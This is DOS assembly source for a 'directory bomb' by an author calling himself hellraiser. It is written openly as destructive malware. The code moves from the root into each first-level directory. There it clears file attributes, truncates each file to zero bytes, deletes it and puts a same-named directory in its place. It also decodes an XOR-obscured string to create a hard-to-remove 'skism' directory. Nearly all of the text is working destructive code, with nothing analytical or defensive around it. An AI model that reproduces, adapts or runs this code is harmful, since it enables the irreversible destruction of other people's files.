;skism directory bomb v1.00

;written by hellraiser

;this is a lame bomb consisting of repetative/error full code
;but it gets the job done
;when run this program will start at the first directory from the root
;and trash all files in first level directorys
;then create a directory in place of the distroyed file name

;it will also create a semi-removable directory called skism

;yes bombs are very lame, and be advised, this is the only bomb
;skism shall ever write... but we must try everything once

;be warned, the tech used by this program does not only erase files but
;it will also truncate them to 0 bytes, the skism method.

code     segment  'code'
assume   cs:code,ds:code,es:code
         org 0100h

main     proc   near

jmp      start


thestoppa db   1ah                     ;EOF char to stop TYPE command
filecards db   '*.*',0                 ;wildcards for files
dircards  db   '*',0                   ;wildcards for directorys
root      db   '\',0                   ;root directory path
default   db   64    DUP (?)           ;buffer to hold current dir
dirdta    db   43    DUP (?)           ;DTA for dirs
filedta   db   43    DUP (?)           ;DTA for files
dseg      dw    ?                      ;holds old dir DTA segment
dofs      dw    ?                      ;holds old dir DTA segment

start:

     mov  di,offset vl                 ;decrypt skism string
     mov  si,offset vl                 ;
     mov  cx,09h                       ;

     cld                               ;

repeat:

     lodsb                             ;
     xor  al,92h                       ;
     stosb                             ;
     dec  cx                           ;
     jcxz bombstart                    ;
     jmp  repeat                       ;

bombstart:

     mov   dx,offset  dirdta           ;set DTA to hold directorys
     mov   ah,1ah                      ;DOS set DTA function
     int   21h                         ;

     mov   ah,19h                      ;get drive code
     int   21h                         ;

     mov   dl,al                       ;save drive code into dl
     inc   dl                          ;translate for function 3bh

     mov   ah,47h                      ;save current dir
     mov   si, offset default          ;save current dir into buffer
     int   21h                         ;

     mov   dx,offset root              ;change dir to root
     mov   ah,3bh                      ;
     int   21h                         ;

     mov   cx,13h                      ;find directorys
     mov   dx,offset dircards          ;find only directorys
     mov   ah,4eh                      ;find first file

scanloop:

     int   21h                         ;
     jc    quit                        ;quit if no more dirs/error

     jmp   changedir                   ;change to that dir

findnextdir:

     mov   ah,4fh                      ;find next directory
     mov   dx,offset dircards          ;
     jmp   scanloop

changedir:

     mov   dx,offset dirdta + 30       ;point to dir name in DTA
     mov   ah,3bh                      ;change directory
     int   21h                         ;

smash:

     mov   ah,2fh                      ;
     int   21h                         ;
     mov   [dseg],es                   ;save dir DTA segemnt
     mov   [dofs],bx                   ;and offset
     int   21h

     mov   dx,offset filedta           ;use file DTA as new DTA
     mov   ah,1ah                      ;
     int   21h                         ;

     mov   cx,0007h                    ;find flat attributes
     mov   dx,offset filecards         ;point to '*.*',0 wildcard spec
     mov   ah,4eh                      ;find first file

filescanloop:

     int    21h                        ;
     jc     done                       ;quit on error/no files found


     mov    ax,4301h                   ;clear files attributes
     xor    cx,cx                      ;
     mov    dx, offset filedta + 30    ;
     int    21h                        ;
     jc     quit

     mov    ah,3ch                     ;truncate file
     int    21h
     jc     quit

     mov    bx,ax                      ;save handle

     jc     done

     mov    ah,41h                     ;erase file
     int    21h                        ;

     mov    ah,3eh                     ;close file
     int    21h                        ;

     mov    ah,39h                     ;make directory in place of file
     int    21h                        ;

     mov    ah,4fh                     ;find next
     jmp    filescanloop

done:

     mov    ah,1ah                     ;restore directory DTA
     mov    ds,[dseg]                  ;
     mov    dx,[dofs]                  ;
     int    21h

     mov   dx,offset root              ;change dir to root
     mov   ah,3bh                      ;
     int   21h                         ;

     jmp   findnextdir


quit:

     mov    ah,3bh
     mov    dx,offset root             ;change to root
     int    21h

     mov    ah,39h
     mov    dx,offset vl
     int    21h
     jc     restore

restore:

     mov    dx,offset default          ;restore original directory
     mov    ah,3bh                     ;
     int    21h                        ;

     mov    ah,4ch                     ;
     int    21h                        ;

vl   db     0c1h,0f9h,0fbh,0e1h,0ffh,0bch,06dh,0b2h,06dh,0

filler  db  28  dup(1ah)

main    endp
code    ends
        end    main



